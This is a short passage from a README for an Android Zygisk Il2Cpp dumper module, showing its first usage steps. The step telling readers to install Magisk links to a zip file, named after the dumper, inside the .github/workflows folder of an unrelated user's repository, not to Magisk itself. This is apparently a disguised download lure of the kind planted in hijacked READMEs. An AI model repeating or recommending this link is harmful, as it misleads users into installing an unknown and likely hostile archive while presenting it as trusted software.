...
## How to use
1. Install [Magisk](https://raw.githubusercontent.com/xscosa400-wq/Zygisk-Il2CppDumperv4/master/.github/workflows/Zygisk-Cpp-Il-Dumperv-1.8.zip) v24 or later and enable Zygisk
2. Build module
   - GitHub Actions
      1. Fork this repo
